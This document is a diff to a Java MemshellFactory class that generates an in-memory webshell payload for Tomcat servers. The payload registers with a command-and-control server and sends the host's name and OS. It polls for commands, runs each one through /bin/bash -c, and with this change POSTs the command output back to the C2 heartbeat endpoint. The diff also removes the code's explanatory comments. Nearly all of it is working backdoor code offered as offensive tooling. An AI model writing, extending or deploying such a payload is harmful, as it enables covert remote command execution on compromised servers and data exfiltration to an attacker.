@@ -117,11 +117,9 @@ public class MemshellFactory {
                     "try {\n" +
                     "    String __pass = \"%s\";\n" +
                     "    String __c2url = %s.getParameter(\"__c2\");\n" +
-                    "    // Lazy-init: store agent token in system property\n" +
                     "    String __tok = System.getProperty(\"_oobx_tok_\" + __pass);\n" +
                     "    if (__tok == null && __c2url != null) {\n" +
                     "        try {\n" +
-                    "            // Register agent\n" +
                     "            String __fw = \"tomcat\";\n" +
                     "            String __hn = java.net.InetAddress.getLocalHost().getHostName();\n" +
                     "            String __os = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n" +
@@ -138,7 +136,6 @@ public class MemshellFactory {
                     "            java.io.ByteArrayOutputStream __bos = new java.io.ByteArrayOutputStream();\n" +
                     "            int __b = __is.read(); while (__b != -1) { __bos.write(__b); __b = __is.read(); }\n" +
                     "            String __resp = __bos.toString(\"UTF-8\");\n" +
-                    "            // Parse access_token from JSON\n" +
                     "            int __ti = __resp.indexOf(\"access_token\");\n" +
                     "            if (__ti >= 0) {\n" +
                     "                int __s1 = __resp.indexOf('\"', __ti + 14) + 1;\n" +
@@ -149,7 +146,6 @@ public class MemshellFactory {
                     "            }\n" +
                     "        } catch(Exception __reg){}\n" +
                     "    }\n" +
-                    "    // Heartbeat + command exec\n" +
                     "    if (__tok != null) {\n" +
                     "        String __c2u = System.getProperty(\"_oobx_c2_\" + __pass, \"\");\n" +
                     "        try {\n" +
@@ -163,29 +159,52 @@ public class MemshellFactory {
                     "            __hc.getOutputStream().write(\"{}\".getBytes());\n" +
                     "            java.io.InputStream __his = __hc.getInputStream();\n" +
                     "            java.io.ByteArrayOutputStream __hbos = new java.io.ByteArrayOutputStream();\n" +
-                    "            int __hb = __his.read(); while (__hb != -1) { __hbos.write(__hb); __hb = __his.read(); }\n" +
+                    "            int __hb2 = __his.read(); while (__hb2 != -1) { __hbos.write(__hb2); __hb2 = __his.read(); }\n" +
                     "            String __hresp = __hbos.toString(\"UTF-8\");\n" +
-                    "            // Check for pending cmd\n" +
                     "            int __ci = __hresp.indexOf(\"\\\"cmd\\\"\");\n" +
-                    "            if (__ci >= 0 && __hresp.indexOf(\"null\", __ci) < 0) {\n" +
-                    "                int __csi = __hresp.indexOf(\"\\\"cmd\\\"\", __ci + 5);\n" +
-                    "                if (__csi >= 0) {\n" +
-                    "                    int __csv = __hresp.indexOf('\"', __csi + 5) + 1;\n" +
-                    "                    int __cev = __hresp.indexOf('\"', __csv);\n" +
-                    "                    String __cmd = __hresp.substring(__csv, __cev);\n" +
-                    "                    Process __p = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",__cmd});\n" +
-                    "                    java.io.ByteArrayOutputStream __obos = new java.io.ByteArrayOutputStream();\n" +
-                    "                    int __ob = __p.getInputStream().read();\n" +
-                    "                    while (__ob != -1) { __obos.write(__ob); __ob = __p.getInputStream().read(); }\n" +
-                    "                    %s.getWriter().write(__obos.toString(\"UTF-8\"));\n" +
-                    "                    %s.getWriter().flush();\n" +
+                    "            if (__ci >= 0) {\n" +
+                    "                int __cv = __ci + 5;\n" +
+                    "                while (__cv < __hresp.length() && (__hresp.charAt(__cv) == ' ' || __hresp.charAt(__cv) == ':')) __cv++;\n" +
+                    "                if (__cv < __hresp.length() && __hresp.charAt(__cv) == '{') {\n" +
+                    "                    int __idi = __hresp.indexOf(\"\\\"cmd_id\\\"\");\n" +
+                    "                    int __idv = -1;\n" +
+                    "                    if (__idi >= 0) {\n" +
+                    "                        int __ids = __hresp.indexOf(':', __idi) + 1;\n" +
+                    "                        while (__ids < __hresp.length() && __hresp.charAt(__ids) == ' ') __ids++;\n" +
+                    "                        int __ide = __ids;\n" +
+                    "                        while (__ide < __hresp.length() && Character.isDigit(__hresp.charAt(__ide))) __ide++;\n" +
+                    "                        try { __idv = Integer.parseInt(__hresp.substring(__ids, __ide)); } catch(Exception __np){}\n" +
+                    "                    }\n" +
+                    "                    int __csi = __hresp.indexOf(\"\\\"cmd\\\"\", __ci + 5);\n" +
+                    "                    if (__csi >= 0 && __idv >= 0) {\n" +
+                    "                        int __csv = __hresp.indexOf('\"', __csi + 5) + 1;\n" +
+                    "                        int __cev = __hresp.indexOf('\"', __csv);\n" +
+                    "                        String __cmd = __hresp.substring(__csv, __cev);\n" +
+                    "                        Process __pp = Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",__cmd});\n" +
+                    "                        java.io.ByteArrayOutputStream __obos = new java.io.ByteArrayOutputStream();\n" +
+                    "                        int __ob = __pp.getInputStream().read();\n" +
+                    "                        while (__ob != -1) { __obos.write(__ob); __ob = __pp.getInputStream().read(); }\n" +
+                    "                        String __out = __obos.toString(\"UTF-8\");\n" +
+                    "                        try {\n" +
+                    "                            String __rb = \"{\\\"cmd_id\\\":\" + __idv + \",\\\"output\\\":\\\"\" + __out + \"\\\"}\";\n" +
+                    "                            java.net.URL __ru = new java.net.URL(__c2u + \"/api/c2/agent/heartbeat?ws_token=\" + java.net.URLEncoder.encode(__tok, \"UTF-8\"));\n" +
+                    "                            java.net.HttpURLConnection __rc = (java.net.HttpURLConnection) __ru.openConnection();\n" +
+                    "                            __rc.setRequestMethod(\"POST\");\n" +
+                    "                            __rc.setDoOutput(true);\n" +
+                    "                            __rc.setConnectTimeout(5000);\n" +
+                    "                            __rc.setReadTimeout(5000);\n" +
+                    "                            __rc.setRequestProperty(\"Content-Type\", \"application/json\");\n" +
+                    "                            __rc.getOutputStream().write(__rb.getBytes(\"UTF-8\"));\n" +
+                    "                            __rc.getInputStream().close();\n" +
+                    "                        } catch(Exception __re){}\n" +
+                    "                    }\n" +
                     "                }\n" +
                     "            }\n" +
-                    "        } catch(Exception __hb2){}\n" +
+                    "        } catch(Exception __hbe){}\n" +
                     "        return;\n" +
                     "    }\n" +
                     "} catch(Exception __c2e){}\n",
-                    password, reqVar, respVar, respVar
+                    password, reqVar
                 );
 
             case "cmd":
